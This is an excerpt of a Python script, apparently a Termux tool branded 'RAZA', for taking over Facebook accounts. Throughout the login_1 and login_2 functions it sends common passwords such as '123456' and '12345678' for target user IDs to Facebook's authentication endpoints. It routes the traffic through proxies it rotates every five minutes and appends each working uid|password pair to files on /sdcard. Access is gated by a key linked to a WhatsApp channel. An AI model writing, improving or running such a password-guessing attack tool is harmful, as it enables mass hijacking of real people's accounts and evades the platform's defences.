...
os.system('clear')
print(' \x1b[38;5;46mRAZA SERVER LOADING....')
...
channel_link = "https://chat.whatsapp.com/HBBWmgTmpNl7OvG2MCpQtR?mode=gi_t"

# Valid keys (channel par available hogi)
approved_keys = ["RAZA YOUTUBER 420"]
...
# ─── PROXY MANAGER ───────────────────────────────────────────────
PROXY_API_URL = "https://api.princetechn.com/api/tools/proxy?apikey=prince"
proxy_list = []
current_proxy = None
...
def rotate_proxy():
    ...
    with proxy_lock:
        if proxy_list:
            ...
            print(f"\n\x1b[38;5;46m[PROXY] \x1b[1;37mNew Proxy: \x1b[38;5;220m{current_proxy}\x1b[0m")
...
def proxy_rotator_thread():
    rotate_proxy()
    while True:
        time.sleep(300)
        rotate_proxy()

_proxy_thread = threading.Thread(target=proxy_rotator_thread, daemon=True)
_proxy_thread.start()
# ─────────────────────────────────────────────────────────────────
...
# Set window title
sys.stdout.write('\x1b]2;𓆩【R.A.Z.A 👑 】𓆪 \x07')


    # RAZA Clover Logo - Green - Version 2.5
def ____banner____():
...
def login_1(uid):
    ...
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAZA-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            ...
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, proxies=get_proxy_dict(), allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAZA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/RAZA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAZA-OK💚\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/RAZA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
...
def login_2(uid):
    ...
    """
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAZA-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    ...
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                ...
                po = session.get(url, headers=headers, proxies=get_proxy_dict()).json()
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAZA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/RAZA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
